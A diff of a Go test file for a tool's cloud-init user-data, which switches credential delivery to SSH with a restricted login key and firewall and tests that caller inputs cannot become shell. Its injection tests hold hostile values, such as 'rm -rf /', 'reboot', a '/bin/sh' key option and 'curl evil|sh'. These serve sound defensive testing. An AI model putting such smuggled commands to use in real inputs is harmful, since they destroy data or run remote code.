@@ -1,6 +1,8 @@
 package machinelaunch
 
 import (
+	"bytes"
+	"crypto/ed25519"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -10,6 +12,7 @@ import (
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
+	"golang.org/x/crypto/ssh"
 	"gopkg.in/yaml.v3"
 
 	"github.com/subgentic/coral/internal/updater/verify"
@@ -17,10 +20,18 @@ import (
 
 // #9973: the cloud-init user-data: a golden for a fixed spec, what it must always say, and that nothing a caller passes can become shell.
 
-const testCredential = "chb_TESTCREDENTIAL0123456789abcdefghij"
+// testClientKey is a fixed ed25519 public key (from a seed of sevens), the launch's login key in the golden.
+func testClientKey() string {
+	pub := ed25519.NewKeyFromSeed(bytes.Repeat([]byte{7}, 32)).Public().(ed25519.PublicKey)
+	k, err := ssh.NewPublicKey(pub)
+	if err != nil {
+		panic(err)
+	}
+	return strings.TrimSpace(string(ssh.MarshalAuthorizedKey(k)))
+}
 
 func goldenSpec() UserDataSpec {
-	return UserDataSpec{Credential: testCredential, MaxMode: "launch", CoralVersion: "2.0.3", Agents: []string{"claude@2.0.0", "codex@0.1.0", "agy@sha256:" + strings.Repeat("ab", 32)}}
+	return UserDataSpec{ClientPublicKey: testClientKey(), AllowSSHFrom: "203.0.113.9", MaxMode: "launch", CoralVersion: "2.0.3", Agents: []string{"claude@2.0.0", "codex@0.1.0", "agy@sha256:" + strings.Repeat("ab", 32)}}
 }
 
 func TestUserDataMatchesItsGolden(t *testing.T) {
@@ -51,11 +62,16 @@ func TestUserDataSaysWhatItMustAlwaysSay(t *testing.T) {
 	assert.Equal(t, "coral", u["name"])
 	assert.Equal(t, true, u["lock_passwd"], "no password")
 	assert.NotContains(t, u, "sudo", "no sudo")
-	assert.NotContains(t, u, "ssh_authorized_keys")
-	// the firewall: deny incoming, before anything is downloaded
+	// the login key: one PUBLIC key, key only, nothing forwarded (Security's condition E on #10917)
+	keys := u["ssh_authorized_keys"].([]any)
+	require.Len(t, keys, 1)
+	assert.Equal(t, "no-port-forwarding,no-agent-forwarding,no-X11-forwarding "+testClientKey(), keys[0])
+	// the firewall: deny incoming, SSH only from the launcher's address, before anything is downloaded
 	i := strings.Index(got, "[ ufw, default, deny, incoming ]")
 	j := strings.Index(got, "      /usr/local/sbin/coral-machine-setup\n")
 	require.True(t, i > 0 && j > i, "deny incoming comes before the setup step")
+	assert.Contains(t, got, "[ ufw, allow, from, '203.0.113.9', to, any, port, '22', proto, tcp ]", "SSH is open to the launcher's address only")
+	assert.NotContains(t, got, "[ ufw, allow, 22/tcp ]", "never open to everyone")
 	assert.Contains(t, got, "[ ufw, --force, enable ]")
 	// the Coral release is verified before it is installed
 	assert.Contains(t, got, "sha256sum -c expected.sum")
@@ -64,22 +80,34 @@ func TestUserDataSaysWhatItMustAlwaysSay(t *testing.T) {
 	assert.Contains(t, got, "--proto '=https' --tlsv1.2")
 	assert.Contains(t, got, "https://github.com/subgentic/coral/releases/download/v${version}")
 	assert.Contains(t, got, "set -eu", "it stops at the first failure")
-	// the credential: tmpfs, 0600, owned by coral, in a folder only coral reads, written after the setup and before the service
-	assert.Contains(t, got, "install -d -m 0700 -o coral -g coral /run/coral/bootstrap.d")
+	// no credential, anywhere (#10917, coral-hub Security): it goes over SSH, on standard input, to /run/coral/bootstrap.d/credential after the pin matched
+	assert.NotContains(t, got, "chb_", "no Hub credential")
+	assert.NotContains(t, got, "printf '%s'", "nothing writes a secret from the user-data")
+	assert.NotContains(t, got, "BEGIN OPENSSH PRIVATE KEY", "no private key in this commit's user-data")
+	assert.NotContains(t, got, "set -x", "no shell tracing")
+	assert.NotContains(t, got, "set -o xtrace")
+	assert.Contains(t, got, "install -d -m 0700 -o coral -g coral /run/coral/bootstrap.d", "the folder the credential goes in: only coral reads it")
 	assert.Contains(t, got, "install -d -m 0755 -o root -g root /run/coral\n", "/run/coral stays root's")
 	assert.NotContains(t, got, "  - nodejs", "node and npm are not installed before Coral has redeemed")
-	assert.Contains(t, got, "chmod 0600 /run/coral/bootstrap.d/credential")
-	assert.Equal(t, 1, strings.Count(got, testCredential), "the credential appears exactly once")
-	assert.NotContains(t, got, "set -x", "no shell tracing: it would print the credential")
-	assert.NotContains(t, got, "set -o xtrace")
-	assert.NotContains(t, got, "echo '"+testCredential, "the credential is written straight to its file, never echoed")
-	assert.Contains(t, got, "(umask 077; printf '%s' '"+testCredential+"' > /run/coral/bootstrap.d/credential)", "straight to the tmpfs file, 0600")
-	k := strings.Index(got, testCredential)
-	assert.Greater(t, k, strings.Index(got, "      /usr/local/sbin/coral-machine-setup\n"), "after the setup step")
-	assert.Less(t, k, strings.Index(got, "systemctl enable --now coral.service"), "before the service starts")
-	wf := doc["write_files"].([]any)
-	for _, f := range wf {
-		assert.NotContains(t, f.(map[string]any)["content"], testCredential, "no file written to disk holds the credential")
+	// Coral starts only when the credential file appears, never from the user-data
+	assert.Contains(t, got, "PathExists=/run/coral/bootstrap.d/credential")
+	assert.Contains(t, got, "Unit=coral.service")
+	assert.Contains(t, got, "systemctl enable --now coral-bootstrap.path coral-finish.path coral-finish.timer")
+	assert.NotContains(t, got, "systemctl enable --now coral.service", "the service is not started from the user-data")
+	// the finish step removes every copy of what could open SSH again, and stops AND masks sshd (Security's condition C)
+	finish := fileOf(t, doc, "/usr/local/sbin/coral-machine-finish")
+	for _, want := range []string{
+		"systemctl disable --now ssh.socket ssh.service sshd.service", "systemctl mask ssh.socket ssh.service sshd.service", "ufw --force delete allow 22/tcp",
+		"rm -f /home/coral/.ssh/authorized_keys /etc/ssh/ssh_host_*_key /etc/ssh/ssh_host_*_key.pub", "rm -f /etc/ssh/sshd_config.d/10-coral-bootstrap.conf",
+		"/var/lib/cloud/instance/user-data.txt*", "/var/lib/cloud/instances/*/user-data.txt*", "cloud-config.txt", "/var/lib/cloud/instance/scripts", "/var/log/cloud-init.log", "systemctl enable coral.service",
+	} {
+		assert.Contains(t, finish, want, "the finish step: "+want)
+	}
+	assert.Contains(t, got, "OnActiveSec=20min", "the fallback closes SSH on its own if the launcher never finishes")
+	assert.Contains(t, got, "PathExists=/run/coral/bootstrap.d/done", "and the launcher's done file closes it at once")
+	sshd := fileOf(t, doc, "/etc/ssh/sshd_config.d/10-coral-bootstrap.conf")
+	for _, want := range []string{"PasswordAuthentication no", "PermitRootLogin no", "AllowUsers coral", "AllowTcpForwarding no"} {
+		assert.Contains(t, sshd, want)
 	}
 	// the service: as coral, loopback only, no remote, the chosen cap, the Hub's origin
 	assert.Contains(t, got, "User=coral")
@@ -87,10 +115,9 @@ func TestUserDataSaysWhatItMustAlwaysSay(t *testing.T) {
 	assert.NotContains(t, got, "--remote")
 	assert.Contains(t, got, "NoNewPrivileges=true")
 	// pinned agents, from the table; agy as coral and only because it was asked for unpinned
-	// the credential's life is short: the agent CLIs come AFTER the service is started, and only if it is active
-	svc := strings.Index(got, "systemctl enable --now coral.service")
-	agents := strings.Index(got, "if systemctl is-active --quiet coral.service; then /usr/local/sbin/coral-machine-agents; fi")
-	require.True(t, svc > 0 && agents > svc, "agents are installed after Coral has started")
+	// the agent CLIs come after SSH is closed and Coral is up, from the finish step, and only if Coral is active
+	assert.Contains(t, finish, "if systemctl is-active --quiet coral.service; then /usr/local/sbin/coral-machine-agents || true; fi")
+	assert.Less(t, strings.Index(finish, "systemctl mask"), strings.Index(finish, "coral-machine-agents"), "SSH is closed before the slow installs")
 	assert.NotContains(t, setupOf(t, doc), "npm", "nothing slow before the redeem")
 	assert.NotContains(t, setupOf(t, doc), "antigravity")
 	assert.Contains(t, got, "npm install -g @anthropic-ai/claude-code@2.0.0")
@@ -101,36 +128,55 @@ func TestUserDataSaysWhatItMustAlwaysSay(t *testing.T) {
 	assert.NotContains(t, got, "| bash", "no installer is piped into a shell")
 }
 
-// setupOf is the content of the setup script (the Coral install, which runs before the credential is written).
+// setupOf is the content of the setup script (the Coral install, which runs before the credential arrives).
 func setupOf(t *testing.T, doc map[string]any) string {
+	return fileOf(t, doc, "/usr/local/sbin/coral-machine-setup")
+}
+
+// fileOf is the content of a file the user-data writes.
+func fileOf(t *testing.T, doc map[string]any, path string) string {
 	t.Helper()
 	for _, f := range doc["write_files"].([]any) {
 		m := f.(map[string]any)
-		if m["path"] == "/usr/local/sbin/coral-machine-setup" {
+		if m["path"] == path {
 			return m["content"].(string)
 		}
 	}
-	t.Fatal("no setup script")
+	t.Fatalf("no file %s", path)
 	return ""
 }
 
+// A comment on the login key is dropped, never carried into the user-data.
+func TestALoginKeyCommentIsDropped(t *testing.T) {
+	s := goldenSpec()
+	s.ClientPublicKey = testClientKey() + " ZZINJECT'; id; '"
+	got, err := BuildUserData(s)
+	require.NoError(t, err)
+	assert.NotContains(t, got, "ZZINJECT")
+}
+
 func TestTheDefaultsAreTheSafeOnes(t *testing.T) {
-	got, err := BuildUserData(UserDataSpec{Credential: testCredential, CoralVersion: "2.0.3"})
+	got, err := BuildUserData(UserDataSpec{ClientPublicKey: testClientKey(), AllowSSHFrom: "203.0.113.9", CoralVersion: "2.0.3"})
 	require.NoError(t, err)
 	assert.Contains(t, got, "--cloud-max-mode view", "an empty cap is view")
 	assert.NotContains(t, got, "npm install", "no agents unless named")
 	assert.NotContains(t, got, "antigravity")
 	assert.NotContains(t, got, "coral-machine-agents", "and no agents step at all")
+	assert.NotContains(t, got, "/usr/local/sbin/coral-machine-agents", "the finish step has none either")
 }
 
 func TestNothingACallerPassesCanBecomeShell(t *testing.T) {
 	ok := goldenSpec()
 	bad := map[string]func(*UserDataSpec){
-		"a credential with a quote":         func(s *UserDataSpec) { s.Credential = "chb_aaaaaaaaaaaaaaaaaaaa'; reboot; '" },
-		"a credential with a newline":       func(s *UserDataSpec) { s.Credential = "chb_aaaaaaaaaaaaaaaaaaaa\nrm -rf /" },
-		"a short credential":                func(s *UserDataSpec) { s.Credential = "chb_abc" },
-		"another kind of credential":        func(s *UserDataSpec) { s.Credential = "chk_aaaaaaaaaaaaaaaaaaaaaaaa" },
-		"an empty credential":               func(s *UserDataSpec) { s.Credential = "" },
+		"no login key":                      func(s *UserDataSpec) { s.ClientPublicKey = "" },
+		"a login key that is not a key":     func(s *UserDataSpec) { s.ClientPublicKey = "ssh-ed25519 AAAA not-a-key" },
+		"a login key with options":          func(s *UserDataSpec) { s.ClientPublicKey = "command=\"/bin/sh\" " + testClientKey() },
+		"a login key and a second line":     func(s *UserDataSpec) { s.ClientPublicKey = testClientKey() + "\n" + testClientKey() },
+		"no ssh source":                     func(s *UserDataSpec) { s.AllowSSHFrom = "" },
+		"every address":                     func(s *UserDataSpec) { s.AllowSSHFrom = "0.0.0.0" },
+		"every address as a CIDR":           func(s *UserDataSpec) { s.AllowSSHFrom = "0.0.0.0/0" },
+		"an ssh source host name":           func(s *UserDataSpec) { s.AllowSSHFrom = "example.com" },
+		"an ssh source with a command":      func(s *UserDataSpec) { s.AllowSSHFrom = "203.0.113.9; reboot" },
 		"a max mode that is a command":      func(s *UserDataSpec) { s.MaxMode = "launch; rm -rf /" },
 		"a max mode in capitals":            func(s *UserDataSpec) { s.MaxMode = "LAUNCH" },
 		"a version with a command":          func(s *UserDataSpec) { s.CoralVersion = "2.0.3; curl evil|sh" },
